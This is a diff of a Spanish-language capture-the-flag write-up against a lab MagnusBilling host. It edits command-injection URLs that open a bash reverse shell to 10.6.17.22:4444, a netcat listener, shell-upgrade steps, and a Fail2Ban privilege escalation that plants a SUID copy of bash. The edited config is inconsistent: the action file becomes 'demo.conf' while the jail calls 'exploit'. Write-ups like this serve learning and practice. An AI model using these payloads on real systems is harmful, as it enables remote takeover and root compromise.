@@ -53,8 +53,9 @@ http://biling.thm/mbilling/lib/icepay/icepay.php?democ=/dev/null;sleep%203;ls%20
 
 http://biling.thm/mbilling/lib/icepay/icepay.php?democ=/dev/null;sleep%2030;ls%20a
 
-http://biling.thm/mbilling/lib/icepay/icepay.php?democ=test;bash -c 'bash -i >& /dev/tcp/10.6.17.22/4444 0>&1'
+http://biling.thm/mbilling/lib/icepay/icepay.php?democ=/dev/null;bash -c 'bash -i >& /dev/tcp/10.6.17.22/4444 0>&1'
 
+http://biling.thm/mbilling/lib/icepay/icepay.php?democ=/dev/null;bash -c 'bash -i >& /dev/tcp/10.6.17.22/4444 0>&1';#
 ```
 Exploit:
 ```
@@ -66,7 +67,6 @@ nc -lvnp 4444
 ```
 **Mejora de TTY:**
 ```
-python3 -c 'import pty; pty.spawn("/bin/bash")'
 Ctrl+Z
 stty raw -echo && fg
 script /dev/null -c bash
@@ -99,6 +99,8 @@ Condiciones cumplidas:
 - Se podía reiniciar Fail2Ban mediante `sudo`.
 
 **Procedimiento completo:**
+
+Basado en esta escalamiento https://juggernaut-sec.com/fail2ban-lpe/
 ```bash
 rsync -av /etc/fail2ban/ /tmp/fail2ban/
 
@@ -110,7 +112,7 @@ chmod u+s /tmp/bash
 EOF
 chmod +x /tmp/script
 
-cat > /tmp/fail2ban/action.d/custom-start-command.conf <<'EOF'
+cat > /tmp/fail2ban/action.d/demo.conf <<'EOF'
 [Definition]
 actionstart = /tmp/script
 EOF
@@ -118,7 +120,7 @@ EOF
 cat >> /tmp/fail2ban/jail.local <<'EOF'
 [demo]
 enabled = true
-action = custom-start-command
+action = exploit
 EOF
 
 cat > /tmp/fail2ban/filter.d/demo.conf <<'EOF'
